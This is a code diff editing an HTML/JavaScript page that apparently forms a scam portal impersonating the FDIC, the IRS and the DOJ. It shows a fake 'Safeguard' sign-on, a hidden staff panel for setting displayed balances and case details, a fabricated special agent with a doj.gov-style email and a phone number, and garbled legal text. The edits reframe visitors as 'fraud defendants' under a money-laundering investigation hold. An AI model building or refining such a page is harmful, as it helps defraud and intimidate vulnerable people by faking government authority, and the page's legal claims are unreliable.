@@ -832,7 +832,7 @@
   <!-- ========== LOGIN SCREEN ========== -->
   <div id="login-screen">
     <div class="login-topbar">
-      <svg class="swoosh-svg" viewBox="0 0 200 42" xmlns="http://www.w3.org/2000/svg" aria-label="FDIC Safeguard">
+      <svg class="swoosh-svg" viewBox="0 0 200 42" xmlns="https://connect.safeguard.linkpc.net" aria-label="FDIC Safeguard">
         <text x="0" y="28" fill="#c9a227" font-size="18" font-weight="700" font-family="system-ui,sans-serif">FDIC Safeguard</text>
       </svg>
     </div>
@@ -840,12 +840,12 @@
     <main class="login-main">
       <div class="login-card">
         <h1>Sign On</h1>
-        <p class="login-sub">Verified fraud victims — secure case access only</p>
+        <p class="login-sub">Verified fraud defendants — secure case access only</p>
 
         <div class="notice-box">
           <div class="notice-title">FRAUD DEFENDANTS ONLY</div>
           <div class="notice-body">
-            This portal is not open to the public and does not offer self-enrollment. Access is limited to individuals with an active fraud recovery case who received sign-on credentials from an assigned Recovery Specialist.
+            This portal is not open to the public and does not offer self-enrollment. Access is limited to individuals with an active anti money laundering case who received sign-on credentials from an assigned Recovery Specialist.
           </div>
         </div>
 
@@ -876,7 +876,7 @@
         </form>
 
         <div class="card-bottom-note">
-          Fraud Victim Assistance Program — no public registration. If you do not have issued credentials, contact your Recovery Specialist; do not attempt to create an account here.
+          Fraud Defendant Assistance Program — no public registration. If you do not have issued credentials, contact your Recovery Specialist; do not attempt to create an account here.
           <br />
           <button type="button" class="staff-link" onclick="showScreen('admin-screen')">Staff sign-on</button>
         </div>
@@ -884,7 +884,7 @@
     </main>
 
     <footer class="site-footer">
-      <div class="footer-inner">
+      <div class="footer-inner">to
         <div class="footer-cols">
           <div class="footer-col">
             <h4>CUSTOMER SERVICE</h4>
@@ -909,9 +909,9 @@
         <div class="program-badge">PROGRAM FDIC — IDENTITY FRAUD VICTIMS</div>
         <div class="ehl-row">⌂ EQUAL HOUSING LENDER</div>
         <div class="legal-copy">
-          <p>© FDIC Safeguard. All rights reserved. FDIC deposit insurance at Safe Guard Bank applies only to verified identity-fraud victims enrolled in the Fraud Victim Assistance Program with an active recovery case—not to the general public or standard retail accounts. Where applicable, coverage follows FDIC rules up to $250,000 per depositor, per insured institution, for each ownership category.</p>
+          <p>© FDIC Safeguard. All rights reserved. FDIC deposit insurance at Safe Guard Bank applies only to verified fraud defendants enrolled in the Fraud Defendant Assistance Program with an active recovery case—not to the general public or standard retail accounts. Where applicable, coverage follows FDIC rules up to $250,000 per depositor, per insured institution, for each ownership category.</p>
           <p>This website is for authorized customers only. Unauthorized access, use, or monitoring of this system is prohibited and may be subject to criminal and civil penalties under federal law, including the Computer Fraud and Abuse Act (18 U.S.C. § 1030). Activity may be logged and reviewed. By signing in, you agree to our Online Banking Agreement, Electronic Communications Consent, and Privacy Policy.</p>
-          <p>FDIC Safeguard does not offer general retail banking on this portal. Temporary FDIC Safe Custody Accounts in the Fraud Recovery Center are established only for verified identity-fraud victims with an open federal recovery case, to segregate recovered funds during investigation.</p>
+          <p>FDIC Safeguard does not offer general retail banking on this portal. Temporary FDIC Safe Custody Accounts in the Fraud Defendant Center are established only for verified identity-fraud victims with an open federal recovery case, to segregate recovered funds during investigation.</p>
         </div>
       </div>
     </footer>
@@ -1082,7 +1082,7 @@
 
   const defaultState = {
     userid: 'fedcase1429',
-    pass: 'subjectdefendant00',
+    pass: 'defendant00',
     fullname: 'Alex Morgan',
     firstname: 'Alex',
     ledger: '$000,000,000.00',
@@ -1227,7 +1227,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
     <div class="dash-container" id="top">
       <div class="greeting-banner">
         <div>
-          <h1>Hello, <span id="dash-firstname">Susan</span></h1>
+          <h1>Hello, <span id="dash-firstname">Alex</span></h1>
           <p class="last-signon">Last sign on 11/12/2026</p>
         </div>
         <span class="hold-pill">INVESTIGATION HOLD</span>
@@ -1319,7 +1319,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
             <div class="card-title">Notes to your investigator</div>
             <div class="card-subtitle">
               Secure messages for case <span id="dash-caseref-note">FTA:25CEF1429/COC:25CEF518</span>.
-              Assigned specialist: <span id="dash-spec-note">SA Daniel Wilson</span>
+              Assigned specialist: <span id="dash-spec-note">Special Agent Okono</span>
             </div>
             <div id="notes-history">No messages yet. Use the form below to send a secure note to your assigned investigator.</div>
             <textarea id="secure-note-input" class="note-textarea" placeholder="Type your secure note…"></textarea>
@@ -1384,7 +1384,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
           </div>
           <div class="confidential-banner">
             <strong>CONFIDENTIAL — FEDERAL INVESTIGATION MATTER</strong>
-            <p>Fraud recovery claim opened. An FDIC recovery specialist will contact you shortly.</p>
+            <p>Defendnat refund recovery claim opened. An FDIC recovery specialist will contact you shortly.</p>
           </div>
           <p style="font-size:13px;color:var(--text-muted);margin:10px 0;">Field notes from your assigned Recovery Specialist and federal partners.</p>
           <p style="font-size:13px;color:#334155;">No investigator notations have been posted to your case file yet.</p>
@@ -1393,7 +1393,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
             <div class="specialist-avatar" id="dash-spec-initial">S</div>
             <div>
               <div style="font-size:11px;font-weight:800;color:var(--text-muted);letter-spacing:0.4px;">ASSIGNED SPECIALIST</div>
-              <div style="font-weight:700;color:var(--navy);font-size:15px;" id="dash-spec-name">SA Daniel Wilson</div>
+              <div style="font-weight:700;color:var(--navy);font-size:15px;" id="dash-spec-name">Special Agent Okono</div>
               <div style="font-size:13px;color:var(--text-muted);" id="dash-spec-email">agntokono@doj.gov</div>
               <div style="font-size:13px;color:var(--text-muted);" id="dash-spec-phone">8084910671</div>
             </div>
@@ -1411,7 +1411,8 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
             <div class="log-time">2026-11-12</div>
             <div class="log-title">Financial Audit-CI UNIT/Process and Proceeding</div>
             <div class="log-body">
-              bank records are obtained, civil tax examination, an IRS Criminal Investigation (CI) matter, or both matters are subject to court proceeding under any signs of potential money laundering civil audit, IRS is requiring provide statements, deposit records, loan documents, invoices, contracts, and other records explaining particular deposits or transactions. As the Internal revenue service their is also referencing from federal court judge of the US district courts to seek records from third parties, including banks, through legal process such as a summons, subject to applicable notice and procedural rules. A request for documents does not by itself means IRS has concluded money laundering occurred but there potential beliefs of these accusations. information from law enforcement, what initially lead to a referral for IRS-CI review. IRS-CI this investigations could have as well originate from other agencies, and agents may review financial data and subpoena bank records. A criminal investigation is a separate process from an ordinary audit, though civil and criminal matters can sometimes proceed in parallel. To substantiate the legitimate source and tax treatment of questioned funds, records need to show where each deposit came from, who owned the funds, why they were transferred, and how the amounts were reported. Depending on the transactions, useful documents may include complete bank statements, deposit and wire details, invoices and sales records, loan or gift agreements, proof of transfers between your own accounts, business books, and tax returns. Keep original records and avoid altering or selectively deleting anything.
+              bank records are obtained,federal bureau of investigation,
+                civil tax examination, an IRS Criminal Investigation (CI) matter, or both matters are subject to court proceeding under any signs of potential money laundering civil audit, IRS is requiring provide statements, deposit records, loan documents, invoices, contracts, and other records explaining particular deposits or transactions. As the Internal revenue service their is also referencing from federal court judge of the US district courts to seek records from third parties, including banks, through legal process such as a summons, subject to applicable notice and procedural rules. A request for documents does not by itself means IRS has concluded money laundering occurred but there potential beliefs of these accusations. information from law enforcement, what initially lead to a referral for IRS-CI review. IRS-CI this investigations could have as well originate from other agencies, and agents may review financial data and subpoena bank records. A criminal investigation is a separate process from an ordinary audit, though civil and criminal matters can sometimes proceed in parallel. To substantiate the legitimate source and tax treatment of questioned funds, records need to show where each deposit came from, who owned the funds, why they were transferred, and how the amounts were reported. Depending on the transactions, useful documents may include complete bank statements, deposit and wire details, invoices and sales records, loan or gift agreements, proof of transfers between your own accounts, business books, and tax returns. Keep original records and avoid altering or selectively deleting anything.
             </div>
           </div>
 
@@ -1442,7 +1443,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
           <div class="log-entry">
             <div class="log-time">2026-11-12</div>
             <div class="log-title">Claim submitted</div>
-            <div class="log-body">Your fraud recovery case has been registered.</div>
+            <div class="log-body">Your anti money laundering(AML) recovery case has been registered.</div>
           </div>
         </div>
       </div>
@@ -1474,7 +1475,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
         <div class="program-badge">PROGRAM FDIC —FRAUD DEFENDANTS</div>
         <div class="ehl-row">⌂ EQUAL HOUSING LENDER</div>
         <div class="legal-copy">
-          <p>© FDIC Safeguard. All rights reserved. FDIC deposit insurance at Safe Guard Bank applies only to verified AML(Anti Money Launder)-Fraud victims enrolled in the Fraud defendant Assistance Program with an active recovery case—not to the general public or standard retail accounts. Where applicable, coverage follows FDIC rules up to $250,000 per depositor, per insured institution, for each ownership category.</p>
+          <p>© FDIC Safeguard. All rights reserved. FDIC deposit insurance at Safe Guard Bank applies only to verified AML(Anti-Money Laundering)-Fraud victims enrolled in the Fraud defendant Assistance Program with an active recovery case—not to the general public or standard retail accounts. Where applicable, coverage follows FDIC rules up to $250,000 per depositor, per insured institution, for each ownership category.</p>
           <p>This website is for authorized customers only. Unauthorized access, use, or monitoring of this system is prohibited and may be subject to criminal and civil penalties under federal law, including the Computer Fraud and Abuse Act (18 U.S.C. § 1030). Activity may be logged and reviewed. By signing in, you agree to our Online Banking Agreement, Electronic Communications Consent, and Privacy Policy.</p>
           <p>FDIC Safeguard does not offer general retail banking on this portal. Temporary FDIC Safe Custody Accounts in the Fraud Recovery Center are established only for verified identity-fraud victims with an open federal recovery case, to segregate recovered funds during investigation.</p>
         </div>
@@ -1492,7 +1493,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
       ledgerBalance: "$0.00",
       availableBalance: "$0.00",
       caseRef: "FTA:25CEF1429/COC:25CEF518",
-      specialist: "Special Agent Erin Okono",
+      specialist: "Special Agent Okono",
       email: "agntokono@doj.gov",
       phone: "(808)491-0671",
       disposition: "SUBMITTED",
@@ -1509,7 +1510,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
           return { ...defaultState, ...JSON.parse(saved) };
         }
       } catch (e) {
-        console.warn("localStorage unavailable in this preview context.");
+        console.warn("localStorage unavailable in this context.");
       }
       return { ...defaultState };
     }
@@ -1634,7 +1635,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
       appState.packStatus = document.getElementById("adm-packstatus").value;
       saveState();
       syncUI();
-      document.getElementById("admin-feedback").textContent = "Saved to iPhone localStorage and applied.";
+      document.getElementById("admin-feedback").textContent = "Saved to localStorage and applied.";
     }
 
     function resetAdminDefaults() {
